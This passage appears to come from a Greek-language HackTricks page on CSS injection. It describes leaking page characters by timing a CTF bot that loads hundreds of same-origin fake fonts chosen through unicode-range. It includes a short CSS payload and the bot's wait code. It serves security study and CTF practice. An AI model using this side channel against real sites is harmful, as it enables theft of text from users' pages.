Ωστόσο, αν η διαφορά χρόνου ανάμεσα στην cached απάντηση και στη μη-cached δεν είναι αρκετά μεγάλη, αυτό δεν θα είναι χρήσιμο. Για παράδειγμα, ο συγγραφέας ανέφερε: «Όμως, μετά από δοκιμές, βρήκα ότι το πρώτο πρόβλημα είναι πως η ταχύτητα δεν διαφέρει πολύ, και το δεύτερο είναι ότι το bot χρησιμοποιεί τη σημαία `disk-cache-size=1`, κάτι που είναι πραγματικά προσεκτικό.»

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Σε αυτή την περίπτωση μπορείτε να ορίσετε **CSS που φορτώνει εκατοντάδες ψεύτικες γραμματοσειρές** από την ίδια προέλευση όταν συμβεί ένα match. Με αυτόν τον τρόπο μπορείτε να **μετρήσετε τον χρόνο** που χρειάζεται και να διαπιστώσετε αν ένας χαρακτήρας εμφανίζεται ή όχι με κάτι σαν:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Και ο κώδικας του bot φαίνεται έτσι:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Έτσι, εάν η γραμματοσειρά δεν ταιριάζει, ο χρόνος απόκρισης κατά την επίσκεψη στον bot αναμένεται να είναι περίπου 30 δευτερόλεπτα. Ωστόσο, εάν υπάρχει ταύτιση γραμματοσειράς, θα σταλούν πολλαπλά αιτήματα για την ανάκτηση της γραμματοσειράς, προκαλώντας συνεχή δραστηριότητα στο δίκτυο. Ως αποτέλεσμα, θα χρειαστεί περισσότερο χρόνος για να ικανοποιηθεί η συνθήκη τερματισμού και να ληφθεί η απάντηση. Επομένως, ο χρόνος απόκρισης μπορεί να χρησιμοποιηθεί ως δείκτης για να προσδιοριστεί εάν υπάρχει ταύτιση γραμματοσειράς.

## Αναφορές

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
